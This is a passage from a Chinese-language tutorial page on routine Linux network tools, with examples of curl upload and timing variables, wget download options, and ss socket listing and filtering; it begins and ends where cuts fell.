</span></span></span><span class="line"><span class="cl"><span class="se"></span>-d <span class="s1">&#39;  {   &#34;option&#34;: &#34;value&#34;,    &#34;something&#34;: &#34;anothervalue&#34; }&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="使用curl-上传文件">使用curl 上传文件</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="o">{</span>host<span class="o">}</span>/api/v1/upimg -F <span class="s2">&#34;file=@/Users/fungleo/Downloads/401.png&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;token: 222&#34;</span> -v
</span></span></code></pre></td></tr></table>
</div>
</div><p>也可以指定<code>MIME</code>类型。如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -F <span class="s1">&#39;file=@photo.png;type=image/png&#39;</span> https://<span class="o">{</span>host<span class="o">}</span>/api/v1/upimg
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="curl输出的格式变量">curl输出的格式变量</h3>
<p>curl -w参数提供了一些格式变量，可以达到紧紧获取某些数据</p>
<h3 id="仅获取http状态码">仅获取http状态码</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -w %<span class="o">{</span>http_code<span class="o">}</span> www.baidu.com -o /dev/null -s
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="获取整个请求的时间">获取整个请求的时间</h3>
<p>获取整个请求的耗时，单位秒，显示单位 毫秒</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -w %<span class="o">{</span>time_total<span class="o">}</span> www.baidu.com -o /dev/null -s
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="获取域名解析时间">获取域名解析时间</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -w %<span class="o">{</span>time_namelookup<span class="o">}</span> www.baidu.com -o /dev/null -s
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="获取tcp连接耗时">获取TCP连接耗时</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -w %<span class="o">{</span>time_connect<span class="o">}</span> www.baidu.com -o /dev/null -s
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="获取sslssh握手到远程主机耗时">获取SSL/SSH握手到远程主机耗时</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -w %<span class="o">{</span>time_appconnect<span class="o">}</span> https://www.baidu.com -o /dev/null -s -v
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="获取所有重定向的耗时">获取所有重定向的耗时</h3>
<p>这里是从查找、连接、传输整个事务的完成到开始传送数据之前的耗时</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -w %<span class="o">{</span>time_redirect<span class="o">}</span> www.baidu.com -o /dev/null -s
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="获得下载的总字节数">获得下载的总字节数</h3>
<p>这里是http相应的body长度，而不是加上头部的大小</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -w %<span class="o">{</span>size_download<span class="o">}</span> www.baidu.com -o /dev/null -s
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ curl -w %{size_download} www.baidu.com -o /dev/null -s
</span></span><span class="line"><span class="cl">2381
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="获得请求体送字节数">获得请求体送字节数</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -w %<span class="o">{</span>size_request<span class="o">}</span> www.baidu.com -o /dev/null -s
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="获得传输中的连接数">获得传输中的连接数</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -w %<span class="o">{</span>num_connects<span class="o">}</span> www.baidu.com -o /dev/null -s
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="获得重定向次数">获得重定向次数</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -w %<span class="o">{</span>num_redirects<span class="o">}</span> www.360buy.com -o /dev/null -s  -L
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="获得ssl验证结果">获得SSL验证结果</h3>
<p>0 表示是成功的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -w %<span class="o">{</span>ssl_verify_result<span class="o">}</span> https://www.baidu.com -o /dev/null -s -L
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="获得重定向的地址">获得重定向的地址</h3>
<p>当没有指定<code>-L</code>时，会返回被重定向后的地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -w %<span class="o">{</span>redirect_url<span class="o">}</span> https://www.360buy.com -o /dev/null -s 
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="获得上传和下载速度">获得上传和下载速度</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -w %<span class="o">{</span>speed_download<span class="o">}</span> https://www.360buy.com -o /dev/null -s
</span></span><span class="line"><span class="cl">curl -w %<span class="o">{</span>speed_upload<span class="o">}</span> https://www.360buy.com -o /dev/null -s
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="根据自己需要拼接特定格式">根据自己需要拼接特定格式</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -w <span class="s2">&#34;总共请求时长：%{time_total}\n总跳转次数：%{num_redirects}\n&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>www.360buy.com -o /dev/null -s
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">总共请求时长：1.338总跳转次数：3
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="wget">wget</h2>
<p><em><strong>wget</strong></em> 用于从web下载文件的命令行程序。wget，可以使用 <code>HTTP</code>、<code>HTTPS</code>和 <code>FTP</code> 协议下载文件。wget还允许下载多个文件、断点续传、限速、递归下载、后台下载、镜像网站等等。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian:  <code>wget</code> ； <code>apt install wget</code></li>
<li>CentOS/Fedora: <code>wget</code>  ； <code>yum install -y wget</code></li>
<li>Apline： <code>wget</code> ；  <code>apk add --no-cache wget</code></li>
</ul>
</blockquote>
<h3 id="简单使用">简单使用</h3>
<p>使用wget最简单的方法是为它提供通过HTTP下载的文件的位置。如，下载文件。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://website.com/files/file.zip
</span></span></code></pre></td></tr></table>
</div>
</div><p>该操作会将文件下载到工作目录中。</p>
<h3 id="下载文件并保存为指定名称">下载文件并保存为指定名称</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget –O <span class="o">[</span>file_name<span class="o">]</span> <span class="o">[</span>URL<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="将文件下载到指定目录">将文件下载到指定目录</h3>
<p>默认情况下，wget下载的文件保存在用户所在工作目录中。使用 <code>–P</code> 可以将文件保存到指定路径。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget –P <span class="o">[</span>wanted_directory<span class="o">]</span> <span class="o">[</span>URL<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="设置下载速度">设置下载速度</h3>
<p>在下载时可以设置下载时最大使用带宽，这样就不会使用主机全部的可用带宽。下载速度以 <code>k</code> 和 <code>m</code> 定义单位。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget --limit-rate <span class="o">[</span>wanted_speed<span class="o">]</span> <span class="o">[</span>URL<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">wget --limit-rate 1m http://us.download.nvidia.com/tesla/396.37/nvidia-diag-driver-local-repo-ubuntu1710-396.37_1.0-1_amd64.deb 
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="断点续传">断点续传</h3>
<p>如果在下载时取消，wget提供了可以在中断前停止的地方继续下载。当下载文件时连接丢失时，这个非常有用。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget –c <span class="o">[</span>URL<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="下载多个文件">下载多个文件</h3>
<p>wget也提供了下载多个文件的方法：</p>
<p>方法1：将需要下载的文件地址保存在文件中 使用 <code>-i</code> 指定文件，每个URL 单独占一行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget –i <span class="o">[</span>file_name<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="下载网页网站镜像">下载网页（网站镜像）</h3>
<p>使用 <code>–m</code> 下载URL中包含的所有连接，结果会保存为一个文件夹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget –m <span class="o">[</span>URL<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ftp下载">FTP下载</h3>
<p>wget也可以下载FTP文件，当需要认证时，可以指定FTP的用户名和密码，然后接FTP地址：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget --ftp-user<span class="o">=[</span>ftp_username<span class="o">]</span> --ftp-password<span class="o">=[</span>ftp_password<span class="o">]</span> ftp://...
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="后台下载">后台下载</h3>
<p>当下载文件很大时，wget也支持后台下载文件，在网络不稳定命令行断开时很实用。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget –b <span class="o">[</span>URL<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以使用命令 <code>tail –f wget –log </code> 来检查下载状态</p>
<h3 id="中断重试次数">中断重试次数</h3>
<p>当网络中断后，wget也支持设置在网络中断后尝试下载文件的次数：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget --tries<span class="o">=[</span>number_of_tries<span class="o">]</span> <span class="o">[</span>URL<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="忽略证书验证">忽略证书验证</h3>
<p>默认情况下，wget会验证服务端SSL/TLS证书是否有效。如果识别到无效的证书，它将拒绝下载。当在访问自签名证书时，可以使用<code>--no-check-certificate</code> 忽略验证</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget --no-check-certificate <span class="o">[</span>URL<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="自定义user-agent">自定义User-Agent</h3>
<p>当服务端阻止了特定的 <code>User-Agent </code> 时，可以进行自定义 <code>User-Agent</code> 设置。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget --user-agent<span class="o">=</span>”User Agent Here” “<span class="o">[</span>URL<span class="o">]</span>”
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="实用技巧-下载内容到标准输出stdout">实用技巧-下载内容到标准输出stdout</h3>
<p>如在下载一个tar包时，一般都是wget 后 在tar 解压到对应目录，可以使用 <code>-O -</code> 将其下载到标准输出，<code>-q</code> 静默方式，通过管道直接解压到对应的路径下。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget -q -O - <span class="s2">&#34;http://wordpress.org/latest.tar.gz&#34;</span> <span class="p">|</span> tar -xzf - -C /var/www
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ss">ss</h2>
<p><em><strong>ss</strong></em> (socket statistics) 命令行工具，用于在Linux系统上显示与网络套接字相关的信息。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li><strong>ss</strong></li>
<li>Ubuntu/Debian:  <code>iproute2</code>   ；<code>apt install iproute2</code></li>
<li>CentOS/Fedora: <code>iproute</code>  ；<code>yum install -y iproute</code></li>
<li>Apline：<code>iproute</code> ；<code>apk add --no-cache iproute</code></li>
</ul>
</blockquote>
<h3 id="查看所有连接">查看所有连接</h3>
<p>没有任何选项的ss命令只列出所有连接。</p>
<h3 id="查看listening-与-non-listening-ports">查看Listening 与 Non-listening Ports</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -a
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查看监听-套接字列表">查看监听 套接字列表</h3>
<p>这里列出所有监听套接字，不关其是服务监听还是客户端请求占用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -l
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查看所有tcp连接">查看所有TCP连接</h3>
<p>这里只所有的tcp连接， 包含客户端与服务端</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -t
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查看所有监听类型的tcp连接">查看所有监听类型的tcp连接</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -lt
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查看所有udp连接">查看所有udp连接</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -ua
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查看监听类型的udp连接">查看监听类型的UDP连接</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -lu
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="显示socket的pid进程id">显示socket的pid进程id</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -p
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="显示连接摘要信息">显示连接摘要信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -s
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="显示ipv6或ipv4-连接">显示ipv6或ipv4 连接</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -4
</span></span><span class="line"><span class="cl">ss -6
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="筛选连接">筛选连接</h3>
<p>语法</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss <span class="o">[</span> OPTIONS <span class="o">]</span> <span class="o">[</span> STATE-FILTER <span class="o">]</span> <span class="o">[</span> ADDRESS-FILTER <span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ss命令还提供了筛选方法，过滤套接字端口或地址。例如，要显示具有ssh服务的源端口与目标端口（即监听与客户端连接）。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> ss -at &#39;( dport = :22 or sport = :22 )&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>也可以通过服务名称进行过滤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -at <span class="s1">&#39;( dport = :ssh or sport = :ssh )&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>仅显示所有处于 <code>established</code> 状态的Ipv4 tcp套接字。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -t4 state established -n
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Recv-Q Send-Q   Local Address:Port    Peer Address:Port   
</span></span><span class="line"><span class="cl"><span class="m">0</span>      <span class="m">0</span>        172.16.0.2:22         61.50.248.5:22005   
</span></span><span class="line"><span class="cl"><span class="m">0</span>      <span class="m">0</span>        172.16.0.2:42930      169.254.0.55:5574    
</span></span><span class="line"><span class="cl"><span class="m">0</span>      <span class="m">0</span>        172.16.0.2:22         61.50.248.5:22008   
</span></span><span class="line"><span class="cl"><span class="m">0</span>      <span class="m">0</span>        172.16.0.2:22         61.50.248.5:22003   
</span></span><span class="line"><span class="cl"><span class="m">0</span>      <span class="m">0</span>        172.16.0.2:40652      94.130.12.30:443     
</span></span><span class="line"><span class="cl"><span class="m">0</span>      <span class="m">36</span>       172.16.0.2:22         61.50.248.5:22012   
</span></span><span class="line"><span class="cl"><span class="m">0</span>      <span class="m">0</span>        172.16.0.2:22         61.50.248.5:22004   
</span></span></code></pre></td></tr></table>
</div>
</div><p>列出状态为time wait的套接字</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -t4 state time-wait -n
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里状态可以为下面的任意一种</p>
<blockquote>
<ul>
<li>established</li>
<li>syn-sent</li>
<li>syn-recv</li>
<li>fin-wait-1</li>
<li>fin-wait-2</li>
<li>time-wait</li>
<li>closed</li>
<li>close-wait</li>
<li>last-ack</li>
<li>closing</li>
<li>all  上面所有状态</li>
<li>connected  除listen和closed之外的所有状态</li>
<li>synchronized  除syn-sent之外的所有连接状态</li>
<li>显示状态，这些被维护为mini sockets，即 <code>time-wait </code> 与 <code>syn-recv</code></li>
<li>big 与bucket选项相反</li>
</ul>
</blockquote>
<p>过滤地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -nt dst 74.125.236.178
</span></span></code></pre></td></tr></table>
</div>
</div><p>还可以过滤网段</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -nt dst 74.125.236.178/16
</span></span></code></pre></td></tr></table>
</div>
</div><p>ip和端口的组合</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -nt dst 74.125.236.178:80
</span></span></code></pre></td></tr></table>
</div>
</div><p>源地址为127.0.0.1，且源端口大于5000</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -nt src 127.0.0.1 sport gt :5000
</span></span></code></pre></td></tr></table>
</div>
</div><p>源端口为25的smtp套接字</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -ntlp sport eq :smtp
</span></span></code></pre></td></tr></table>
</div>
</div><p>端口号大于25</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -nt sport gt :1024
</span></span></code></pre></td></tr></table>
</div>
</div><p>远程端口小于100的套接字</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -nt dport <span class="se">\&lt;</span> :100
</span></span></code></pre></td></tr></table>
</div>
</div><p>连接到远程80端口的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -nt state connected <span class="nv">dport</span> <span class="o">=</span> :80
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="不解析主机名">不解析主机名</h3>
<p>可以通过 <code>-n</code> 选项阻止ss 将ip解析为主机名，来达到更快地获得输出，但这也无法进行到端口号的解析。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
